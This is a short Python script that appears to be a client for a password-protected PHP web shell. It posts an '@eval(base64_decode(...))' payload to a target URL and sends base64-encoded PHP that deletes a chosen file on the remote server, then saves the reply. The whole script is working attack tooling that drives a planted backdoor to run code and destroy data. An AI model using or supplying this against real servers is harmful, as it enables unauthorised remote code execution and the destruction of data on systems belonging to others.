import requests
import sys
import base64

url = sys.argv[1]
password = sys.argv[2]
path = sys.argv[3]
store = sys.argv[4]

value = f'echo unlink("{path}")?1:0;'
value = str(base64.b64encode(value.encode('utf-8')),'utf-8')
data = {password:'@eval(base64_decode($_POST[\'x\']));','x':value}
r = requests.post(url=url,data=data)
with open(store,'w') as f:
	f.write(r.text)